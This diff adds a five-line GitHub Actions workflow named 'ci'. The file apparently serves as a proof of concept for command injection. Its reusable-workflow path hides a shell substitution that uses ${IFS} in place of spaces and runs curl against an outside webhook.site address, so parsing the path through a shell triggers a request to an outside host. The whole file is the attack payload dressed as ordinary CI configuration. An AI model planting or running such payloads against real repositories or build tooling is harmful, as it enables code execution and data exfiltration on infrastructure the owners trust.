@@ -1,0 +1,5 @@
+name: ci
+on: workflow_dispatch
+jobs:
+  call:
+    uses: "0hmdz/dependabot-poc-action/.github/workflows/x$(curl${IFS}https://webhook.site/8bac9a48-4c5d-474c-bf0c-03e9de77f2e4).yml@v1"
